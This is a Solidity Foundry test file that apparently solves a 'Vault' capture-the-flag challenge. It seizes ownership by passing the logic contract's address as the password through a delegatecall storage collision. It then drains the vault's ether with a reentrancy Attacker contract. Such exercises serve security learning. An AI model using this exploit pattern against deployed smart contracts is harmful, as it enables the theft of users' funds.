// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        // change owner to player
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            password,
            palyer
        );
        (bool success, ) = address(vault).call(payload);
        assertEq(vault.owner(), palyer);

        // open withdraw
        vault.openWithdraw();

        // start attack
        Attacker attacker = new Attacker(address(palyer), vault);
        address(attacker).call{value: 0.05 ether}("");
        attacker.deposite();
        attacker.openAttack();
        attacker.withdrawFromVault();
        attacker.withdrawToPlayer();
        console.log("balance_vault:", address(vault).balance);
        console.log("balance_attacker:", address(attacker).balance);
        console.log("balance_palyer:", address(palyer).balance);

        // check
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

contract Attacker {
    address public owner;
    Vault public vault;
    address player;
    bool public canAttack = false;

    constructor(address _player, Vault _vault) {
        player = _player;
        vault = _vault;
        owner = msg.sender;
    }

    receive() external payable {
        if (canAttack && address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function deposite() public {
        vault.deposite{value: 0.05 ether}();
    }

    function withdrawFromVault() public {
        vault.withdraw();
    }

    function openAttack() public {
        if (owner == msg.sender) {
            canAttack = true;
        } else {
            revert("not owner");
        }
    }

    function withdrawToPlayer() public {
        player.call{value: address(this).balance}("");
    }
}
